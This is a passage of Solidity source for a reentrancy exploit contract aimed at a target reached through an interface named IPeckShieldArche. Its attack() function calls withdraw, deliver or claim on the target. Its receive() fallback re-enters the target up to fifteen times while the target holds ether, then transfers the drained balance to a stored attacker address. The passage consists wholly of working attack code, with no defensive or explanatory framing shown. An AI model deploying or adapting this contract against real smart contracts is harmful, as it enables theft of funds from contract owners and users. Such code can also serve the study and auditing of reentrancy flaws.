    address public target;
    address public attacker;
    uint256 public callCount;
    uint256 public maxCalls;

    constructor(address _target, address _attacker) {
        target = _target;
        attacker = _attacker;
        maxCalls = 15;
    }

    function attack() external {
        // Try withdraw first (most common pattern)
        try IPeckShieldArche(target).withdraw() {}
        catch {
            // Try deliver
            try IPeckShieldArche(target).deliver() {}
            catch {
                // Try claim
                IPeckShieldArche(target).claim();
            }
        }
    }

    receive() external payable {
        callCount++;
        if (callCount < maxCalls && address(target).balance > 0) {
            try IPeckShieldArche(target).withdraw() {}
            catch {
                try IPeckShieldArche(target).deliver() {}
                catch {
                    IPeckShieldArche(target).claim();
                }
            }
        } else {
            payable(attacker).transfer(address(this).balance);
        }
    }
}

